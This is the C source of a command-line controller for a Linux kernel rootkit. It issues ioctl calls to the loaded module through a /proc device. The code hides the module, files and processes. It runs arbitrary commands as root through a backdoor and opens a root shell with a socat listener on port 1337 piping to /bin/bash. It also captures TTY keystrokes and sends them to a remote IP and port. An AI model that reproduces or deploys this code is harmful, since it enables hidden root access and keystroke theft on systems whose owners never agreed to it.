#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <libgen.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#include "../ioctl.h"
#include "rkctl.h"

#define BUFLEN 4096

static char progname[BUFLEN];

int
main(int argc, char **argv)
{
    strcpy(progname, argc ? basename(argv[0]) : "");
    cmd_t cmd = parse_input(argc, argv);
    return cmd.f(cmd.arg);
}

cmd_t
parse_input(int argc, char **argv)
{
    if (argc <= 1 || ARGVCMP(1, "help")) {
        help();
        exit(0);
    }

    if (ARGVCMP(1, "ping"))
        return (cmd_t){ handle_ping, NULL };

    if (ARGVCMP(1, "unload"))
        return (cmd_t){ handle_modhide, (void *)0 };

    if (ARGVCMP(1, "modhide")) {
        ASSERT_ARGC(2, "modhide <on | off>");

        if (ARGVCMP(2, "on"))
            return (cmd_t){ handle_modhide, (void *)1 };

        if (ARGVCMP(2, "off"))
            return (cmd_t){ handle_modhide, (void *)-1 };
    }

    if (ARGVCMP(1, "filehide")) {
        ASSERT_ARGC(2, "filehide [open] <toggle | on | off>");

        if (ARGVCMP(2, "open")) {
            ASSERT_ARGC(3, "filehide [open] <toggle | on | off>");

            if (ARGVCMP(3, "toggle"))
                return (cmd_t){ handle_openhide, (void *)0 };

            if (ARGVCMP(3, "on"))
                return (cmd_t){ handle_openhide, (void *)1 };

            if (ARGVCMP(3, "off"))
                return (cmd_t){ handle_openhide, (void *)-1 };
        } else {
            if (ARGVCMP(2, "toggle"))
                return (cmd_t){ handle_filehide, (void *)0 };

            if (ARGVCMP(2, "on"))
                return (cmd_t){ handle_filehide, (void *)1 };

            if (ARGVCMP(2, "off"))
                return (cmd_t){ handle_filehide, (void *)-1 };
        }
    }

    if (ARGVCMP(1, "hidepid")) {
        ASSERT_ARGC(3, "hidepid <add | rm> <PID>");

        long arg;
        if ((arg = strtol(argv[3], NULL, 10))) {
            if (ARGVCMP(2, "add"))
                return (cmd_t){ handle_pidhide, (void *)(arg) };

            if (ARGVCMP(2, "rm"))
                return (cmd_t){ handle_pidhide, (void *)((-1) * (arg)) };
        } else {
            fprintf(stderr, "%s: invalid pid `%s`\n", progname, argv[3]);
            exit(1);
        }
    }

    if (ARGVCMP(1, "hidepid-off"))
            return (cmd_t){ handle_pidhide, (void *)0 };

    if (ARGVCMP(1, "backdoor")) {
        ASSERT_ARGC(2, "backdoor <execve_command>");
        return (cmd_t){ handle_backdoor, (void *)argv[2] };
    }

    if (ARGVCMP(1, "shell"))
        return (cmd_t){ handle_shellbd, NULL };

    if (ARGVCMP(1, "backdoor-use-tty")) {
        ASSERT_ARGC(2, "backdoor-use-tty <0 | 1>");

        if (ARGVCMP(2, "0"))
            return (cmd_t){ handle_togglebd, (void *)-1 };

        if (ARGVCMP(2, "1"))
            return (cmd_t){ handle_togglebd, (void *)1 };
    }

    if (ARGVCMP(1, "backdoor-off"))
            return (cmd_t){ handle_togglebd, (void *)0 };

    if (ARGVCMP(1, "inputlogging")) {
        ASSERT_ARGC(3, "inputlogging <ip> <port>");

        char *socket = (char *)malloc(BUFLEN);
        snprintf(socket, BUFLEN, "%s:%s", argv[2], argv[3]);

        return (cmd_t){ handle_logging, (void *)socket };
    }

    if (ARGVCMP(1, "inputlogging-off"))
        return (cmd_t){ handle_logging, (void *)0 };

    help();
    exit(1);
}

int
handle_ping(void *arg)
{
    return issue_ioctl(G7_PING, "PING");
}

int
handle_modhide(void *arg)
{
    return issue_ioctl(G7_MODHIDE, (const char *)arg);
}

int
handle_filehide(void *arg)
{
    return issue_ioctl(G7_FILEHIDE, (const char *)arg);
}

int
handle_openhide(void *arg)
{
    return issue_ioctl(G7_OPENHIDE, (const char *)arg);
}

int
handle_pidhide(void *arg)
{
    return issue_ioctl(G7_PIDHIDE, (const char *)arg);
}

int
handle_backdoor(void *arg)
{
    return issue_ioctl(G7_BACKDOOR, (const char *)arg);
}

int
handle_shellbd(void *arg)
{
    static const char *socat_cmd = "socat"
        " tcp4-listen:1337,reuseaddr,fork"
        " exec:/bin/bash,pty,stderr,setsid";

    issue_ioctl(G7_BACKDOOR, socat_cmd);

    static char *argv[] = {
        "sh",
        "-c",
        "nc 127.0.0.1 1337",
        NULL
    };

    return execv(argv[0], argv);
}

int
handle_togglebd(void *arg)
{
    return issue_ioctl(G7_TOGGLEBD, (const char *)arg);
}

int
handle_logging(void *arg)
{
    return issue_ioctl(G7_LOGGING, (const char *)arg);
}

int
issue_ioctl(unsigned long request, const char *argp)
{
    int fd;
    char device[BUFLEN];
    sprintf(device, "/proc/%s", G7_DEVICE);

    if ((fd = open(device, O_RDWR)) < 0) {
        fprintf(stderr, "%s: unable to open %s, is the rootkit running?\n", progname, device);
        exit(1);
    }

    int ret = ioctl(fd, request, argp);
    close(fd);

    return ret;
}

void
help()
{
    printf("usage: %s <command>\n\n", progname);
    printf("These are the available commands:\n");
    printf("%-38s %s\n", "help", "this message");
    printf("%-38s %s\n", "ping", "send an echo request to the rootkit");
    printf("%-38s %s\n", "unload", "gracefully unload the rootkit module");
    printf("%-38s %s\n", "modhide <on | off>", "{,un}hide rootkit module");
    printf("%-38s %s\n", "filehide [open] <toggle | on | off>", "{,un}hide [open] files");
    printf("%-38s %s\n", "hidepid <add | rm> <PID>", "{,un}hide a process");
    printf("%-38s %s\n", "backdoor <execve_command>", "exec a command as root");
    printf("%-38s %s\n", "shell", "obtain a shell as root");
    printf("%-38s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or TTY (1)");
    printf("%-38s %s\n", "backdoor-off", "disable any (read or tty) backdoor");
    printf("%-38s %s\n", "inputlogging <ip> <port>", "intercept {P,T}TY input and send it to <ip>:<port>");
    printf("%-38s %s\n", "inputlogging-off", "disable input logging");
}
